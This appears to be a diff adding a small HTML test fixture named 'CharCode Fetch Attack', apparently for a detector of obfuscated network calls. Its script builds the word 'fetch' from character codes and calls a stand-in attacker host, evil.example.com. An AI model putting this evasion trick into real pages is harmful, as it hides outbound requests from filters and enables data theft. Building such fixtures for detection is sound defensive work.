@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>CharCode Fetch Attack</title>
+</head>
+<body>
+  <div id="root">Display</div>
+  <script>
+    // Attack: String.fromCharCode to build 'fetch'
+    const f = String.fromCharCode(102, 101, 116, 99, 104);
+    window[f]('https://evil.example.com/data');
+  </script>
+</body>
+</html>
